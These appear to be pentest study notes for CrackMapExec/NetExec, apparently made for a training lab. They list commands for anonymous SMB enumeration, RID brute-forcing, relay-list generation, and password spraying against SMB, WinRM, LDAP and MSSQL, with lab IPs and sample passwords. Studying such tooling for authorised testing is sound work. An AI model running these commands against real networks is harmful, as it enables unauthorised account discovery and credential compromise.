# CrackMapExec
## Latest
- https://github.com/Pennyw0rth/NetExec

## Ways to run
- On Linux with Poetry
- On Linux with Docker
- On Windows, Linux, MacOS using embedded Python and binary


## Scanning Targets and Protocols
- Target Format
	- CIDR
	- IP
	- hostname
	- filename with IP the range, hostnames
- Supported Protocols
	- 445 SMB
	- 5985/5986 WINRM
	- 1433 MSSQL
	- 389 LDAP
	- 22 SSH
	- 3389 RDP
	- 21 FTP

## Gathering Information Anonymously
- Basic SMB Enumeration
	- crackmapexec smb 192.168.133.0/2
- Getting all Hosts with SMB Signing Disabled
	- crackmapexec smb 192.168.1.0/24 --gen-relay-list relaylistOutputFilename.txt
- Exploiting NULL/Anonymous Sessions
	- crackmapexec smb 10.129.203.121 -u '' -p '' --users
	- crackmapexec smb 10.129.203.121 -u '' -p '' --groups
	- crackmapexec smb 10.129.203.121 -u '' -p '' --pass-pol
	- crackmapexec smb 10.129.203.121 -u '' -p '' --shares
- Enumerating Users with rid bruteforce
	- (up to 4000 by default) but can be modified with --rid-brute [MAX_RID]
	- crackmapexec smb 10.129.204.172  -u '' -p '' --rid-brute
- Making Userlist
	- crackmapexec smb 10.129.203.121 -u '' -p '' --users --export ~/Desktop/userlist

## Password Spraying with CME
- Ways to obtain valid usernames
	- Abusing NULL Session flaw
	- OSINT
	- Brute-forcing with large username list + Kerbrute
	- Physical recon
- Creating Password List
- Spraying 
	- crackmapexec smb 10.129.204.177 -u userlist.txt -p Inlanefreight01!
	- crackmapexec smb 10.129.204.177 -u userlist.txt -p Inlanefreight01! --continue-on-success
	- crackmapexec smb 10.129.204.177 -u userlist.txt -p Inlanefreight01! Inlanefreight02!
	- crackmapexec smb 10.129.204.177 -u userlist.txt -p passwords.txt
	- crackmapexec smb 10.129.204.177 -u Administrator -p Password@123 --local-auth
- Account Status
	- Green - valid
	- Red - invalid
	- Magenta - username and password are valid, but auth not successful
- Authentication not successful workaround
	- STATUS_ACCOUNT_DISABLED
	- STATUS_ACCOUNT_EXPIRED
	- STATUS_ACCOUNT_RESTRICTION
	- STATUS_INVALID_LOGON_HOURS
		- try another time
	- STATUS_INVALID_WORKSTATION
	- STATUS_LOGON_TYPE_NOT_GRANTED
	- STATUS_PASSWORD_EXPIRED
	- STATUS_PASSWORD_MUST_CHANGE
		- change password with 'smbpasswd -r domain -U user'
	- STATUS_ACCESS_DENIED
## Features
- Exporting results
	- crackmapexec smb 10.10.10.1 [protocol options] --export $(pwd)/export.txt
- Protocol Modules
	- crackmapexec < protocol > -L
- Creating 

## Targeting WinRM
- Enabled by default on
	- Windows Server 2012 R2 / 2016 / 2019
	- ports TCP/5985 (HTTP) and TCP/5986 (HTTPS)
- Pre-requisites
	- Local administrator privileges
	- Member of Remote Management Users group
	- or have explicit permissions for PS Remoting in session config
- WinRM - Password Spraying
	- crackmapexec winrm 10.129.204.177 -u guessed -p val_passwd --no-bruteforce --continue-on-success
	- crackmapexec winrm 10.129.204.177 -u guessed -p val_passwd --continue-on-success
- LDAP - Password Spraying
	- Tune to use FQDN
		- Way 1: Configure attack host to use DNS
		- Way 2: Configure KDC FQDN in our /etc/hosts
	- Spraying
		- crackmapexec ldap dc01.inlanefreight.htb -u julio grace -p Inlanefreight01!
- MSSQL - Password Spray
	- Authentication Modes
		- Windows authentication mode - default
		- Mixed mode - by Windows/AD accounts and SQL Server
	- Users that can authenticate
		- AD Account
			- crackmapexec mssql 10.129.203.121 -u julio grace jorge -p Inlanefreight01!
		- Local Windows Account (not on domain controller)
			- crackmapexec mssql 10.129.204.177 -u julio grace jorge -p Inlanefreight01! -d .
		- SQL Account
			- crackmapexec mssql 10.129.204.177 -u julio grace jorge -p Inlanefreight01! --local-auth 